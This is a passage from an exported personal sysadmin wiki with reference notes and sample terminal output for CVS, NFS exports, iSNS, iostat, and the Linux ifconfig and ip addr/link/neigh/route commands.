cvs rtag -D &quot;24 Sep 1972 20:05&quot; rel-2-0 .
}}}
Remove a tag (not branch)
{{{
cvs rtag -d rel-0-4 tc
}}}
Creating a branch
{{{
# Using the working copy of the current working directory
$ cvs tag -b rel-1-0-patches
# Without using the working copy
$ cvs rtag -b -r rel-1-0 rel-1-0-patches tc
}}}
Update the working copy to a branch or tag
{{{
$ cvs update -r rel-1-0-patches
}}}
Merging branches
{{{
# Merge all changes from the branch, to the current working dir
$ cvs update -j R1fix m.c  
}}}
Adding files to cvs
{{{
cvs add a.c
cvs commit a.c
cvs add b
cvs add b/b.c
}}}
Removing file sfrom cvs
{{{
cvs remove a.c
cvs commit a.c
}}}
Keyword list
{{{
$Author$
    The login name of the user who checked in the revision. 
$Date$
    The date and time (UTC) the revision was checked in. 
$Header$
    A standard header containing the full pathname of the RCS file, the revision number, the date (UTC), the author, the state, and the locker (if locked). Files will normally never be locked when you use CVS. 
$Id$
    Same as $Header$, except that the RCS filename is without a path. 
$Name$
    Tag name used to check out this file. The keyword is expanded only if one checks out with an explicit tag name. For example, when running the command cvs co -r first, the keyword expands to Name: first. 
$Locker$
    The login name of the user who locked the revision (empty if not locked, which is the normal case unless cvs admin -l is in use). 
$Log$
    The log message supplied during commit, preceded by a header containing the RCS filename, the revision number, the author, and the date (UTC). Existing log messages are not replaced. Instead, the new log message is inserted after $Log:...$. Each new line is prefixed with the same string which precedes the $Log keyword. For example, if the file contains:

      /* Here is what people have been up to:
       *
       * $Log: frob.c,v $
       * Revision 1.1  1997/01/03 14:23:51  joe
       * Add the superfrobnicate option
       *
       */

    then additional lines which are added when expanding the $Log keyword will be preceded by  * . Unlike previous versions of CVS and RCS, the comment leader from the RCS file is not used. The $Log keyword is useful for accumulating a complete change log in a source file, but for several reasons it can be problematic. See section 12.5 Problems with the $Log$ keyword.. 
$RCSfile$
    The name of the RCS file without a path. 
$Revision$
    The revision number assigned to the revision. 
$Source$
    The full pathname of the RCS file. 
$State$
    The state assigned to the revision. States can be assigned with cvs admin -s---see section A.6.1 admin options. 
}}}



!References
http://www.network-theory.co.uk/docs/cvsmanual/index.html

</pre>
</div>
<div title="fsid" modifier="YourName" modified="201006061851" created="201003190801" changecount="2">
<pre>This option forces the filesystem identification portion of the file handle and file attributes used on the wire to be num instead of a number derived from the major and minor number of the block device on which the filesystem is mounted. Any 32 bit number can be used, but it must be unique amongst all the exported filesystems.

This can be useful for NFS failover, to ensure that both servers of the failover pair use the same NFS file handles for the shared filesystem thus avoiding stale file handles after failover.

{{{
/nfs4exports 192.168.18.129/26(ro,sync,insecure,no_root_squash,no_subtree_check,fsid=0)
/nfs4exports/vmware-data 192.168.18.129/26(rw,nohide,sync,insecure,no_root_squash,no_subtree_check,fsid=1)
/nfs4exports/xen-config 192.168.18.129/26(rw,nohide,sync,insecure,no_root_squash,no_subtree_check,fsid=2)
}}}

fsid=0 has magic properties in NFSv4. For NFSv4, there is a distinguished filesystem which is the root of all exported filesystem. This is specified with fsid=root or fsid=0 both of which mean exactly the same thing.
</pre>
</div>
<div title="iSNS" modifier="BhargavaKancherla" created="200810170723" changecount="1">
<pre>!iSNS
Internet Storage Name Service (iSNS) protocol allows automated discovery, management and configuration of iSCSI and Fibre Channel devices (using iFCP gateways) on a TCP/IP network.

Components
* The iSNS Protocol (iSNSP)
* iSNS clients
* iSNS servers
* iSNS databases

Service provided
* Name Registration and Storage Resource Discovery
* Discovery Domains and Login Control
* State Change Notification
* Bidirectional Mappings Between Fibre Channel and iSCSI Devices - Because the iSNS database stores naming and discovery information about both Fibre Channel and iSCSI devices, iSNS servers are able to store mappings of Fibre Channel devices to proxy iSCSI device images on the IP network. These mappings may also be made in the opposite direction, allowing iSNS servers to store mappings from iSCSI devices to proxy WWNs.

!RFC
RFC 4171: Internet Storage Name Service (iSNS)

!Entity Status monitoring
* iSCSI target device may register for Entity Status Inquiry (ESI) messages
* Entity Status Inquiry (ESI)  message is sent by the iSNS server, and is used to verify that an iSNS client Portal is reachable and available.
* If the Portal fails to respond to an administratively-determined number of consecutive ESI messages, then the iSNS server SHALL remove that Portal from the iSNS database. 
* Appropriate State Change Notifications, if any, SHALL be triggered. 

!iSNS Server Discovery by clients
* Static
* SLP (Service Location Protocol)
* DHCP (rfc 4174)
* Broadcast from Server (periodically)

</pre>
</div>
<div title="ifconfig" modifier="YourName" modified="200807021006" created="200807021004" changecount="7">
<pre>!ifconfig

!!!Interface Flags
|!Flag	|!Description|
|UP	|device is functioning|
|BROADCAST	|device can send traffic to all hosts on the link|
|RUNNING	|cable connection can be detected|
|MULTICAST	|device can perform and receive multicast packets|
|ALLMULTI	|device receives all multicast packets on the link|
|PROMISC	|device receives all traffic on the link|


{{{
# Bringing down an interface with ifconfig
[root@tristan]# ifconfig eth0 down
[root@tristan]# ifconfig
lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
	  UP LOOPBACK RUNNING  MTU:16436  Metric:1
	  RX packets:306 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:306 errors:0 dropped:0 overruns:0 carrier:0
	  collisions:0 txqueuelen:0 
          RX bytes:29504 (28.8 Kb)  TX bytes:29504 (28.8 Kb)


# Bringing up an interface with ifconfig
[root@tristan]# ifconfig eth0 192.168.99.35 netmask 255.255.255.0 up
[root@tristan]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51
          inet addr:192.168.99.35  Bcast:192.168.99.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	  RX packets:190312 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:86955 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100 
          RX bytes:30701229 (29.2 Mb)  TX bytes:7878951 (7.5 Mb)
          Interrupt:9 Base address:0x5000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
	  UP LOOPBACK RUNNING  MTU:16436  Metric:1
	  RX packets:306 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:306 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:29504 (28.8 Kb)  TX bytes:29504 (28.8 Kb)


# Changing MTU with ifconfig

[root@tristan]# ifconfig eth0 mtu 1412
[root@tristan]# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51
          inet addr:192.168.99.35  Bcast:192.168.99.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING MULTICAST  MTU:1412  Metric:1
	  RX packets:190312 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:86955 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100 
          RX bytes:30701229 (29.2 Mb)  TX bytes:7878951 (7.5 Mb)
          Interrupt:9 Base address:0x5000


# Setting interface flags with ifconfig

[root@tristan]# ifconfig eth0 promisc
[root@tristan]# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51
          inet addr:192.168.99.35  Bcast:192.168.99.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1412  Metric:1
	  RX packets:190312 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:86955 errors:0 dropped:0 overruns:0 carrier:0
	  collisions:0 txqueuelen:100 
	  RX bytes:30701229 (29.2 Mb)  TX bytes:7878951 (7.5 Mb)
	  Interrupt:9 Base address:0x5000
[root@tristan]# ifconfig eth0 -promisc
[root@tristan]# ifconfig eth0 -arp
[root@tristan]# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51
          inet addr:192.168.99.35  Bcast:192.168.99.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING NOARP MULTICAST  MTU:1412  Metric:1
	  RX packets:190312 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:86955 errors:0 dropped:0 overruns:0 carrier:0
	  collisions:0 txqueuelen:100 
	  RX bytes:30701229 (29.2 Mb)  TX bytes:7878951 (7.5 Mb)
	  Interrupt:9 Base address:0x5000
}}}
								                

</pre>
</div>
<div title="iostat - I/O performance testing" modifier="YourName" modified="201004160721" created="201004160627" changecount="1">
<pre>!rrqm/s
The number of read requests merged per second that were queued to the device.
!wrqm/s
The number of write requests merged per second that were queued to the device.
!r/s
The number of read requests that were issued to the device per second.
!w/s
The number of write requests that were issued to the device per second.
!rsec/s
The number of sectors read from the device per second.
!wsec/s
The number of sectors written to the device per second.
!rkB/s
The number of kilobytes read from the device per second.
!wkB/s
The number of kilobytes written to the device per second.
!rMB/s
The number of megabytes read from the device per second.
!wMB/s
The number of megabytes written to the device per second.
!avgrq-sz
The average size (in sectors) of the requests that were issued to the device. (for both reads and writes). ie (rsec + wsec) / (r + w)
!avgqu-sz
The average queue length of the requests that were issued to the device.
!await
The average time (in milliseconds) for I/O requests issued to the device to be served. This includes the time spent by the requests in queue and the time spent servicing them.
!svctm
The average service time (in milliseconds) for I/O requests that were issued to the device. 
Note: await includes svctim. Infact await (average time taken for each IO Request to complete) = the average time that each request was in queue (lets call it queuetime) PLUS the average time each request took to process (svctm)
!%util
Percentage of CPU time during which I/O requests were issued to the device (bandwidth utilization for the device). Device saturation occurs when this value is close to 100%.


!Interpreting iostat values
Lets take the above example

{{{
Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await  svctm  %util
dm-0              0.00     0.00  611.40  414.23 20286.60  1656.93 42.79    17.50   17.33   0.96  98.57
}}}
* avg time that each request spent in queue (qtime) = await  svctime = 17.33  0.96 =&gt; 16.37 ms
* avg time tha each request spent being serviced = 0.96 ms
* so averagely each IO request spent 17.33ms to et processed of which 16.37 ms were spent just waiting in queue
* %util can be calculated as (r/s + w/s) * svctim / 1000ms * 100  =&gt; 1025*0.96/1000 * 100 =&gt; 98.5%
* This simple means that in a 1 second interval, 1025 requests were sent to disk, each of which took 0.96ms for the disk to process resulting in 984 ms of disk utilization time in a period of 1 s (or 1000 ms). This means the disk is greater than 98% utilized

On this disk subsystem, it is clear that the disk cannot process more IO requests than what it is getting

http://bhavin.directi.com/iostat-and-disk-utilization-monitoring-nirvana/

On every Linux box the following should be graphed at 5 minute averages

* %util: When this figure is consistently approaching above 80% you will need to take any of the following actions -
** increasing RAM so dependence on disk reduces
** increasing RAID controller cache so disk dependence decreases
** increasing number of disks so disk throughput increases (more spindles working parallely)
** horizontal partitioning
* (await-svctim)/await*100: The percentage of time that IO operations spent waiting in queue in comparison to actually being serviced. If this figure goes above 50% then each IO request is spending more time waiting in queue than being processed. If this ratio skews heavily upwards (in the &gt;75% range) you know that your disk subsystem is not being able to keep up with the IO requests and most IO requests are spending a lot of time waiting in queue. In this scenario you will again need to take any of the actions above
* %iowait: This number shows the % of time the CPU is wasting in waiting for IO. A part of this number can result from network IO, which can be avoided by using an Async IO library. The rest of it is simply an indication of how IO-bound your application is. You can reduce this number by ensuring that disk IO operations take less time, more data is available in RAM, increasing disk throughput by increasing number of disks in a RAID array, using SSD (Check my post on Solid State drives vs Hard Drives) for portions of the data or all of the data etc

!hdparm
{{{
[root@hawk ~]# cat /sys/block/hda/queue/read_ahead_kb;hdparm -t /dev/hda{,,}
128

/dev/hda:
Timing buffered disk reads: 70 MB in 3.05 seconds = 22.92 MB/sec

/dev/hda:
Timing buffered disk reads: 72 MB in 3.02 seconds = 23.84 MB/sec

/dev/hda:
Timing buffered disk reads: 68 MB in 3.03 seconds = 22.44 MB/sec
}}}</pre>
</div>
<div title="ip addr" modifier="BhargavaKancherla" modified="200807071206" created="200807021012" changecount="7">
<pre>!ip addr

{{{
# Displaying IP information with ip address
[root@tristan]# ip address show
1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
[root@tristan]# ip address show dev eth0
    2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
[root@wan-gw]# ip address show wan0
    8: wan0: &lt;POINTOPOINT,NOARP,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ppp 01:f4 peer 00:00
    inet 205.254.209.73 peer 205.254.209.74/32 scope global wan0
[root@real-example]# ip address show ppp0
    5: ppp0: &lt;POINTOPOINT,MULTICAST,NOARP,UP&gt; mtu 1492 qdisc htb qlen 3
    link/ppp 
    inet 67.38.163.197 peer 67.38.163.254/32 scope global ppp0
}}}

!!!IP Scope under ip address
|!Scope|!Description|
|global|	valid everywhere|
|site	|valid only within this site (~IPv6)|
|link|	valid only on this device|
|host|	valid only inside this host (machine)|

{{{

# Adding IP addresses to an interface with ip address

[root@tristan]# ip address add 192.168.99.37/24 brd + dev eth0
[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
    inet 192.168.99.37/24 brd 192.168.99.255 scope global secondary eth0

}}}

 There are a few items of note. You can use ip address add even if the link layer on the device is down. This means that you can readdress an interface without bringing it up. When you add an address within the same CIDR network as another address on the same interface, the second address becomes a secondary address, meaning that if the first address is removed, the second address will also be purged from the interface.

In order to support compatibility with ifconfig the ip address command allows the user to specify a label on every hosted address on a given device. After adding an address to an interface as we did in Example C.7, Adding IP addresses to an interface with ip address, ifconfig will not report that the new IP 192.168.99.37 is hosted on the same device as the primary IP 192.168.99.35. In order to prevent this sort of confusion or apparently contradictory output, you should get in the habit of using the label option to identify each IP hosted on a device. Let's take a look at how to remove the 192.168.99.37 IP from eth0 and add it back so that ifconfig will report the presence of another IP on the eth0 device. 

{{{

# Removing IP addresses from interfaces with ip address

[root@tristan]# ip address del 192.168.99.37/24 brd + dev eth0
[root@tristan]# ip address add 192.168.99.37/24 brd + dev eth0 label eth0:0
[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
    inet 192.168.99.37/24 brd 192.168.99.255 scope global secondary eth0:0
[root@tristan]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51
	  inet addr:192.168.99.35  Bcast:192.168.99.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	  RX packets:190312 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:86955 errors:0 dropped:0 overruns:0 carrier:0
	  collisions:0 txqueuelen:100 
	  RX bytes:30701229 (29.2 Mb)  TX bytes:7878951 (7.5 Mb)
	  Interrupt:9 Base address:0x5000 

eth0:0    Link encap:Ethernet  HWaddr 00:80:C8:F8:4A:51  
          inet addr:10.10.20.10  Bcast:10.10.20.255  Mask:255.255.255.0
	  UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	  Interrupt:9 Base address:0x1000

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
	  UP LOOPBACK RUNNING  MTU:16436  Metric:1
	  RX packets:306 errors:0 dropped:0 overruns:0 frame:0
	  TX packets:306 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:29504 (28.8 Kb)  TX bytes:29504 (28.8 Kb)


#  Removing all IPs on an interface with ip address flush

[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
    inet 192.168.99.37/24 brd 192.168.99.255 scope global secondary eth0:0
[root@tristan]# ip address flush
Flush requires arguments.
[root@tristan]# ip address flush dev eth0
[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
		          
}}}</pre>
</div>
<div title="ip link" modifier="YourName" modified="200807021116" created="200807020956" changecount="5">
<pre>{{{
# Using ip link show
[root@tristan]# ip link show
1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
}}}

Line one summarizes the current name of the device, the flags set on the device, the maximum transmission unit (MTU) the active queueing mechanism (if any), and the queue size if there is a queue present. The second line will always indicate the type of link layer in use on the device, and link layer specific information.

{{{
    
# Using ip link set to change device flags	          
[root@tristan]# ip link set dev eth0 promisc on
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,PROMISC,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    [root@tristan]# ip link set dev eth0 multicast off promisc off
    [root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
[root@tristan]# ip link set arp off
Not enough of information: &quot;dev&quot; argument is required.
[root@tristan]# ip link set arp off dev eth0
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,NOARP,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    [root@enclitic root]# ip link set dev eth0 arp on 
    [root@tristan root]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff


# Deactivating a link layer device with ip link set
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    [root@tristan]# ip route show
    192.168.99.0/24 dev eth0  proto kernel  scope link  src 192.168.99.35
    127.0.0.0/8 dev lo  scope link 
    default via 192.168.99.254 dev eth0
[root@tristan]# ip link set dev eth0 down
[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
[root@tristan]# ip route show
127.0.0.0/8 dev lo  scope link


# Activating a link layer device with ip link set
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    [root@tristan]# arping -D -I eth0 192.168.99.35
    Interface &quot;eth0&quot; is down
[root@tristan]# ip link set dev eth0 up
[root@tristan]# ip address show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.35/24 brd 192.168.99.255 scope global eth0
    [root@tristan]# ip route show
    192.168.99.0/24 dev eth0  proto kernel  scope link  src 192.168.99.35
    127.0.0.0/8 dev lo  scope link


# Using ip link set to change device flags
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff
[root@tristan]# # ip link set dev eth0 mtu 1412
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1412 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff


# Changing the device name with ip link set
[root@tristan]# ip link set dev eth0 mtu 1500
[root@tristan]# ip link set dev eth0 name inside
[root@tristan]# ip link show dev inside
2: inside: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:4a:51 brd ff:ff:ff:ff:ff:ff


# Changing broadcast and hardware addresses with ip link set
[root@tristan]# ip link set dev inside name eth0
[root@tristan]# ip link set dev eth0 address 00:80:c8:f8:be:ef
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:be:ef brd ff:ff:ff:ff:ff:ff
[root@tristan]# ip link set dev eth0 broadcast ff:ff:88:ff:ff:88
[root@tristan]# ip link show dev eth0
2: eth0: &lt;BROADCAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 100
    link/ether 00:80:c8:f8:be:ef brd ff:ff:88:ff:ff:88
    [root@tristan]# ping -c 1 -n 192.168.99.254 &gt;/dev/null 2&gt;&amp;1 &amp;
    [root@tristan]# tcpdump -nnqtei eth0
    tcpdump: listening on eth0
    0:80:c8:f8:be:ef ff:ff:88:ff:ff:88 42: arp who-has 192.168.99.254 tell 192.168.99.35
    0:80:c8:f8:be:ef ff:ff:88:ff:ff:88 42: arp who-has 192.168.99.254 tell 192.168.99.35

}}}</pre>
</div>
<div title="ip neigh" modifier="YourName" modified="200807020950" created="200807020946" changecount="11">
<pre>!ARP tables using ip neighbor 

{{{
#  Displaying the ARP cache with ip neighbor show
[root@tristan]# ip neighbor show
192.168.99.254 dev eth0 lladdr 00:80:c8:f8:5c:73 nud reachable


# Displaying the ARP cache on an interface with ip neighbor show
[root@wan-gw]# ip neighbor show dev eth0
205.254.211.39 lladdr 00:02:b3:a1:b8:df nud delay
205.254.211.54 lladdr 00:d0:b7:80:ce:ce nud delay
205.254.211.179 lladdr 00:80:c8:f8:5c:72 nud reachable


# Displaying the ARP cache for a particular network with ip neighbor show
[root@masq-gw]# ip neighbor show 192.168.100.0/24
192.168.100.1 dev eth3 lladdr 00:c0:7b:7d:00:c8 nud stale
192.168.100.17 dev eth0 lladdr 00:80:c8:e8:4b:8e nud reachable


# Entering a permanent entry into the ARP cache with ip neighbor add
[root@masq-gw]# ip neighbor add 192.168.100.1 lladdr 00:c0:7b:7d:00:c8 dev eth3 nud permanent


# Entering a proxy ARP entry with ip neighbor add proxy
# -- this is deprecated; use arp or kernel proxy_arp instead --#
[root@masq-gw]# ip neighbor add proxy 192.168.100.1 dev eth0
# -- this is deprecated; use arp or kernel proxy_arp instead --#


# Altering an entry in the ARP cache with ip neighbor change
[root@tristan]# ip neighbor add 192.168.99.254 lladdr 00:80:c8:27:69:2d dev eth3
RTNETLINK answers: File exists
[root@tristan]# ip neighbor show 192.168.99.254
192.168.99.254 dev eth0 lladdr 00:80:c8:f8:5c:73 nud reachable
[root@tristan]# ip neighbor change 192.168.99.254 lladdr 00:80:c8:27:69:2d dev eth3
[root@tristan]# ip neighbor show 192.168.99.254
192.168.99.254 dev eth0 lladdr 00:80:c8:27:69:2d nud permanent


# Removing an entry from the ARP cache with ip neighbor del
[root@masq-gw]# ip neighbor del 192.168.100.1 dev eth3
[root@masq-gw]# ip neighbor show dev eth3
192.168.100.1  nud failed


# Removing learned entries from the ARP cache with ip neighbor flush
[root@tristan]# ip neighbor flush dev eth3

}}}
</pre>
</div>
<div title="ip route" modifier="BhargavaKancherla" modified="200807071206" created="200807021030" changecount="2">
<pre>{{{

# Viewing a simple routing table with route
[root@tristan]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
192.168.99.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0
127.0.0.0       0.0.0.0         255.0.0.0       U     0      0        0 lo
0.0.0.0         192.168.99.254  0.0.0.0         UG    0      0        0 eth0
[root@tristan]# ip route show
192.168.99.0/24 dev eth0  scope link 
127.0.0.0/8 dev lo  scope link 
default via 192.168.99.254 dev eth0

          
# Viewing the routing cache with route
[root@tristan]# route -Cen
Kernel IP routing cache
Source          Destination     Gateway         Flags   MSS Window  irtt Iface
194.52.197.133  192.168.99.35   192.168.99.35     l      40 0          0 lo
192.168.99.35   194.52.197.133  192.168.99.254         1500 0         29 eth0
192.168.99.35   192.168.99.254  192.168.99.254         1500 0          0 eth0
192.168.99.254  192.168.99.35   192.168.99.35     il     40 0          0 lo
192.168.99.35   192.168.99.35   192.168.99.35     l   16436 0          0 lo
192.168.99.35   194.52.197.133  192.168.99.254         1500 0          0 eth0
192.168.99.35   192.168.99.254  192.168.99.254         1500 0          0 eth0
          

# Viewing the local routing table with ip route show table local

[root@tristan]# ip route show table local
local 192.168.99.35 dev eth0  proto kernel  scope host  src 192.168.99.35 
broadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1 
broadcast 192.168.99.255 dev eth0  proto kernel  scope link  src 192.168.99.35 
broadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1 
local 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1 
local 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1

}}}

The first field in this output tells us whether the route is for a broadcast address or an IP address or range locally hosted on this machine. Subsequent fields inform us through which device the destination is reachable, and notably (in this table) that the kernel has added these routes as part of bringing up the IP layer interfaces.

For each IP hosted on the machine, it makes sense that the machine should restrict accessiblity to that IP or IP range to itself only. This explains why, in Example D.12, Viewing the local routing table with ip route show table local, 192.168.99.35 has a host scope. Because tristan hosts this IP, there's no reason for the packet to be routed off the box. Similarly, a destination of localhost (127.0.0.1) does not need to be forwarded off this machine. In each of these cases, the scope has been set to host.

For broadcast addresses, which are intended for any listeners who happen to share the IP network, the destination only makes sense as for a scope of devices connected to the same link layer [49]. 


{{{

# Viewing a routing table with ip route show table

[root@tristan]# ip route show table special
Error: argument &quot;special&quot; is wrong: table id value is invalid

[root@tristan]# echo 7 special &gt;&gt; /etc/iproute2/rt_tables
[root@tristan]# ip route show table special
[root@tristan]# ip route add table special default via 192.168.99.254
[root@tristan]# ip route show table special
default via 192.168.99.254 dev eth0
 


# Displaying the routing cache with ip route show cache

[root@tristan]# ip route show cache 192.168.100.17
192.168.100.17 from 192.168.99.35 via 192.168.99.254 dev eth0 
    cache  mtu 1500 rtt 18ms rttvar 15ms cwnd 15 advmss 1460
192.168.100.17 via 192.168.99.254 dev eth0  src 192.168.99.35 
    cache  mtu 1500 advmss 1460


# Displaying statistics from the routing cache with ip -s route show cache

[root@tristan]# ip -s route show cache 192.168.100.17
192.168.100.17 from 192.168.99.35 via 192.168.99.254 dev eth0 
    cache  users 1 used 326 age 12sec mtu 1500 rtt 72ms rttvar 22ms cwnd 2 advmss 1460
192.168.100.17 via 192.168.99.254 dev eth0  src 192.168.99.35 
    cache  users 1 used 326 age 12sec mtu 1500 advmss 1460

}}}

With this output, you'll get just a bit more information about the routes. The most interesting datum is usually the &quot;used&quot; field, which indicates the number of times this route has been accessed in the routing cache. This can give you a very good idea of how many times a particular route has been used. The age field is used by the kernel to decide when to expire a cache entry. The age is reset every time the route is accessed 


{{{

# Adding a static route to a network with route add
[root@masq-gw]# ip route add 10.38.0.0/16 via 192.168.100.1


# Adding a prohibit route with route add

[root@masq-gw]# ip route add prohibit 209.10.26.51
[root@tristan]# ssh 209.10.26.51
ssh: connect to address 209.10.26.51 port 22: No route to host
[root@masq-gw]# tcpdump -nnq -i eth2
tcpdump: listening on eth2
22:13:13.740406 192.168.99.35.51973 &gt; 209.10.26.51.22: tcp 0 (DF)
22:13:13.740714 192.168.99.254 &gt; 192.168.99.35: icmp: host 209.10.26.51 unreachable - admin prohibited filter [tos 0xc0]


# Using from in a routing command with route add
[root@masq-gw]# ip route add prohibit 209.10.26.51 from 192.168.99.3


# Setting the default route with ip route add default
[root@tristan]# ip route add default via 192.168.99.254


# Using src in a routing command with route add
[root@masq-gw]# ip route add default via 205.254.211.254 src 205.254.211.198 table 7



# Creating a NAT route for a single IP with ip route add nat

[root@masq-gw]# ip route add nat 205.254.211.17 via 192.168.100.17
[root@masq-gw]# ip route show table local | grep ^nat
nat 205.254.211.17 via 192.168.100.17  scope host
          


# Creating a NAT route for an entire network with ip route add nat

[root@masq-gw]# ip route add nat 205.254.211.32/29 via 192.168.100.32
[root@masq-gw]# ip route show table local | grep ^nat
nat 205.254.211.32/29 via 192.168.100.32  scope host
          

# Removing routes with ip route del

[root@masq-gw]# ip route show
192.168.100.0/30 dev eth3  scope link
205.254.211.0/24 dev eth1  scope link
192.168.100.0/24 dev eth0  scope link
192.168.99.0/24 dev eth0  scope link
192.168.98.0/24 via 192.168.99.1 dev eth0
10.38.0.0/16 via 192.168.100.1 dev eth3
127.0.0.0/8 dev lo  scope link 
default via 205.254.211.254 dev eth1
[root@masq-gw]# ip route del 10.38.0.0/16 via 192.168.100.1 dev eth3
          


# Altering existing routes with ip route change

[root@tristan]# ip route change default via 192.168.99.113 dev eth0
[root@tristan]# ip route show
192.168.99.0/24 dev eth0  scope link 
